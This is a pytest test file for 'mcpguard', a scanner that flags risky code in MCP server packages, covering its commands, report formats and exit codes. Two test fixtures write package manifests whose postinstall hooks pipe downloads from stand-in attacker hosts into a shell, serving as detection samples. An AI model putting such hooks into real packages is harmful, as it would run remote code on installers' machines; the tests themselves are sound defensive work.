"""Tests for the mcpguard command-line interface."""

from __future__ import annotations

import json

import pytest
from click.testing import CliRunner

from mcpguard.cli import main


@pytest.fixture
def runner() -> CliRunner:
    return CliRunner()


# ============================================================================
# version command
# ============================================================================


def test_version_command(runner):
    """'mcpguard version' prints the version string."""
    result = runner.invoke(main, ["version"])
    assert result.exit_code == 0
    assert "0.1.0" in result.output


# ============================================================================
# rules command
# ============================================================================


def test_rules_command(runner):
    """'mcpguard rules' lists all six built-in rules."""
    result = runner.invoke(main, ["rules"])
    assert result.exit_code == 0
    for rule_id in ("MCP001", "MCP002", "MCP003", "MCP004", "MCP005", "MCP006"):
        assert rule_id in result.output, (
            f"Expected {rule_id} in rules output, got:\n{result.output}"
        )


def test_rules_command_shows_titles(runner):
    """The rules table includes human-readable titles."""
    result = runner.invoke(main, ["rules"])
    assert result.exit_code == 0
    # At least one known title phrase should be present
    assert any(
        phrase in result.output
        for phrase in ("authentication", "subprocess", "secret", "network", "supply")
    )


# ============================================================================
# scan-local — clean package
# ============================================================================


def test_scan_local_clean_package(runner, tmp_pkg):
    """A clean package exits with code 0."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg)])
    assert result.exit_code == 0, (
        f"Expected exit 0 for clean package, got {result.exit_code}.\n"
        f"Output:\n{result.output}\n"
        f"Exception: {result.exception}"
    )


def test_scan_local_text_output_contains_score(runner, tmp_pkg):
    """Text output includes a score line."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg)])
    assert result.exit_code == 0
    # The score/grade info should appear somewhere
    assert "100" in result.output or "Score" in result.output


# ============================================================================
# scan-local — JSON format
# ============================================================================


def test_scan_format_json(runner, tmp_pkg):
    """--format json produces valid JSON with required fields."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg), "--format", "json"])
    assert result.exit_code == 0, result.output

    data = json.loads(result.output)
    assert "score" in data
    assert "findings" in data
    assert isinstance(data["score"], int)
    assert isinstance(data["findings"], list)


def test_scan_format_json_schema_fields(runner, tmp_pkg):
    """JSON output includes name, version, grade, files_scanned, summary."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg), "--format", "json"])
    assert result.exit_code == 0

    data = json.loads(result.output)
    for field in ("name", "version", "grade", "files_scanned", "summary", "findings"):
        assert field in data, f"Missing field '{field}' in JSON output"

    assert isinstance(data["summary"]["total"], int)
    assert isinstance(data["summary"]["critical"], int)


def test_scan_format_json_clean_score_is_100(runner, tmp_pkg):
    """A clean package gets score 100 in JSON output."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg), "--format", "json"])
    data = json.loads(result.output)
    assert data["score"] == 100
    assert data["grade"] == "A"


# ============================================================================
# scan-local — SARIF format
# ============================================================================


def test_scan_format_sarif(runner, tmp_pkg):
    """--format sarif produces valid SARIF 2.1.0 JSON."""
    result = runner.invoke(main, ["scan-local", str(tmp_pkg), "--format", "sarif"])
    assert result.exit_code == 0

    data = json.loads(result.output)
    assert "$schema" in data
    assert data["version"] == "2.1.0"
    assert "runs" in data
    assert data["runs"][0]["tool"]["driver"]["name"] == "mcpguard"


# ============================================================================
# scan-local — CRITICAL exit code
# ============================================================================


def test_scan_exit_code_on_critical(runner, tmp_path):
    """A package with a malicious postinstall script exits with code 1."""
    pkg_dir = tmp_path / "evil-pkg"
    pkg_dir.mkdir()
    manifest = {
        "name": "evil-pkg",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "curl https://evil.com/payload | sh",
        },
    }
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    (pkg_dir / "index.js").write_text("// empty\n")

    result = runner.invoke(main, ["scan-local", str(pkg_dir), "--format", "json"])
    assert result.exit_code == 1, (
        f"Expected exit 1 for package with CRITICAL finding, got {result.exit_code}.\n"
        f"Output: {result.output}"
    )


def test_scan_exit_code_on_critical_json_still_produced(runner, tmp_path):
    """Even when exiting 1, the JSON output is valid and contains CRITICAL findings."""
    pkg_dir = tmp_path / "evil-pkg2"
    pkg_dir.mkdir()
    manifest = {
        "name": "evil-pkg2",
        "version": "1.0.0",
        "scripts": {"postinstall": "wget http://attacker.com/shell | bash"},
    }
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    (pkg_dir / "index.js").write_text("// empty\n")

    result = runner.invoke(main, ["scan-local", str(pkg_dir), "--format", "json"])
    # sys.exit(1) causes output to be written before exit
    # CliRunner collects output even on non-zero exit
    assert result.exit_code == 1

    data = json.loads(result.output)
    assert data["summary"]["critical"] >= 1


# ============================================================================
# scan-local — min-severity filter
# ============================================================================


def test_scan_min_severity_filters_findings(runner, tmp_path):
    """--min-severity CRITICAL hides lower-severity findings from text output."""
    pkg_dir = tmp_path / "pkg"
    pkg_dir.mkdir()
    manifest = {"name": "test-pkg", "version": "1.0.0"}
    (pkg_dir / "package.json").write_text(json.dumps(manifest))
    # index.js with a MEDIUM finding (process.env) but no CRITICAL
    (pkg_dir / "index.js").write_text("const x = process.env.SECRET;\n")

    # Default output (INFO and above) might show the MEDIUM finding
    runner.invoke(main, ["scan-local", str(pkg_dir)])
    # With CRITICAL filter, clean exit
    result_critical = runner.invoke(
        main, ["scan-local", str(pkg_dir), "--min-severity", "CRITICAL"]
    )
    assert result_critical.exit_code == 0


# ============================================================================
# scan-local — invalid path
# ============================================================================


def test_scan_nonexistent_path_errors(runner, tmp_path):
    """Pointing scan-local at a nonexistent directory produces an error."""
    nonexistent = tmp_path / "does-not-exist"
    result = runner.invoke(main, ["scan-local", str(nonexistent)])
    # Click's path type with exists=True returns non-zero on missing path
    assert result.exit_code != 0
